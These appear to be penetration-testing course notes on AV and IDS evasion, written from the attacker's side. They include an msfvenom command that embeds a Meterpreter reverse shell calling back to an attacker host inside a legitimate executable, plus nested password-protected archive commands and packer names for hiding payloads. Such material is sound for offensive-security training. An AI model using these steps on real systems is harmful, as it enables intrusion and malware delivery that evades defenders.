# Defensive Mechanisms Overview

Understanding target defenses is critical for quiet and efficient attacks.

### Protection Types

|Type|Description|
|:--|:--|
|**Endpoint Protection**|Software services (AV, Antimalware, Firewall, Anti-DDOS) protecting a single host (workstation or server).|
|**Perimeter Protection**|Physical or virtual devices at the network edge providing access from public to private zones.|
|**DMZ**|A virtual space for public-facing servers with lower security than internal networks but higher trust than the Internet.|

### Detection Methodologies

Security policies use **allow and deny statements** to dictate traffic flow.

|Method|Detection Logic|
|:--|:--|
|**Signature-based**|Compares network packets or files against pre-ordained attack patterns (signatures).|
|**Heuristic / Anomaly**|Identifies deviations from an established network baseline or known APT behavior.|
|**Stateful Protocol Analysis**|Compares events against pre-built profiles of accepted non-malicious protocol activity.|
|**SOC-based**|Live monitoring by analysts using software to identify and action threats.|

---

# Evasion Techniques: Network Traffic

### 1. Encrypted Communication

**Use Case:** Use to bypass **Network-based IDS/IPS** that inspects cleartext traffic. **Why it matters:** Metasploit (MSF6) can tunnel **AES-encrypted** communication from Meterpreter shells back to the attacker.

### 2. DNS Exfiltration

**Use Case:** Use when **strict traffic rules** flag connections based on the sender's IP address. **Goal:** Siphon data through allowed services (e.g., DNS) to avoid detection by standard filters.

---

# Evasion Techniques: Payloads

### 1. Backdooring Legitimate Executables

**Use Case:** Use to bypass **file fingerprinting** and signature-based detection when default payloads are immediately flagged. **Goal:** Embed shellcode into a legitimate installer or program to obfuscate malicious code.

**Operational Workflow:**

1. Select a legitimate executable template.
2. Inject the payload using `msfvenom` with the `-k` flag to ensure the original application continues its normal execution in one thread while the payload runs in another.
3. Apply encoders and iterations to further obfuscate the shellcode.

|Parameter|Description|
|:--|:--|
|`-x`|Specifies the legitimate executable template to use.|
|`-k`|Keeps the original template functionality by running the payload in a separate thread.|
|`-e`|Specifies the encoder (e.g., `x86/shikata_ga_nai`).|
|`-i`|Number of encoding iterations.|

**Command Reference:**

```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -k -x <TEMPLATE_PATH> -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_PATH> -i 5
```

**Attack Implications:** If the target runs the backdoored file from a **CLI environment**, a separate window will pop up that remains open until the session is terminated, potentially alerting the user.

### 2. Password-Protected Archives

**Use Case:** Use to bypass **automated signature scanning**, as AV engines often cannot scan encrypted content. **Goal:** Wrap the payload in multiple layers of encryption and obfuscation.

**Operational Workflow:**

1. Archive the payload and set a **password**.
2. **Remove the file extension** (e.g., `.rar` or `.zip`) to further hinder identification.
3. Archive the resulting file a second time and set another password.

**Command Reference:**

```
# Archive the payload with a password
rar a <ARCHIVE_NAME>.rar -p <PASSWORD> <PAYLOAD_FILE>

# Remove the extension
mv <ARCHIVE_NAME>.rar <NEW_NAME>

# Archive the first archive again
rar a <FINAL_ARCHIVE>.rar -p <PASSWORD> <NEW_NAME>
```

**Failure Conditions:** Password-locked files may be flagged as **"unable to scan"** in AV dashboards, which can lead to manual inspection by an administrator.

### 3. Executable Packers

**Use Case:** Use as an additional layer of protection against file scanning mechanisms. **Goal:** Compress the payload, the original program, and the decompression code into a single file that restores itself in memory when executed.

**Popular Packers:**

- UPX packer
- The Enigma Protector
- MPRESS
- ExeStealth
- Themida

---

# Evasion Techniques: Exploit Coding

**Use Case:** Use when targeting services where standard exploit patterns (like Buffer Overflows) are easily identified by IDS/IPS.

**Key Strategies:**

1. **Randomization:** Input an **Offset switch** in the exploit code to vary patterns and break signature matches for well-known exploit buffers.
2. **Avoid Obvious NOP Sleds:** IPS/IDS entities check for standard NOP sleds; these should be replaced or avoided where the shellcode lands.

**Attack Implications:** Custom exploit code should be tested in a **sandbox environment** first, as defenders may only allow one attempt before blocking the attacker.